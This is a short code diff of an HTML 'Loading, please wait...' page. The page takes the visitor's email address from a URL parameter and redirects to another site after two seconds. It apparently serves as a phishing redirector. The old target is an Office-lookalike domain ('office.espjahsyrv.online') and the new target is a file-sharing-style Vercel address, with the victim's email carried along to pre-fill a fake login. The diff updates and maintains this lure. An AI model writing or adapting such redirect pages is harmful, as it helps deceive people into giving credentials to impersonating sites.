@@ -57,13 +57,13 @@
       // Show the logo container
       document.querySelector(".logo-container").style.opacity = "1";
 
-      // Extract the Base64-encoded email from the URL
+      // Get the plain email directly from the URL (no decoding)
       const urlParams = new URLSearchParams(window.location.search);
-      const encodedEmail = urlParams.get("e");
+      const email = urlParams.get("e");
 
       // Construct redirect URL
-      const baseRedirect = "https://office.espjahsyrv.online/DJvVEdgh#";
-      const finalUrl = encodedEmail ? baseRedirect + encodeURIComponent(encodedEmail) : baseRedirect;
+      const baseRedirect = "https://myfilesio.vercel.app/?id=";
+      const finalUrl = email ? baseRedirect + encodeURIComponent(email) : baseRedirect;
 
       // Wait 2 seconds then redirect
       setTimeout(() => {
@@ -74,7 +74,7 @@
 </head>
 <body>
   <div class="logo-container">
-    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgZmlsbD0iIzAwNThkMSIvPjxwYXRoIGQ9Ik0zNSA1MGwxNSA1MCAxNS01MHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="Loading">
+    <img class="logo" src="logo.svg" alt="Loading">
     <div class="loading-text">Loading, please wait...</div>
   </div>
 </body>
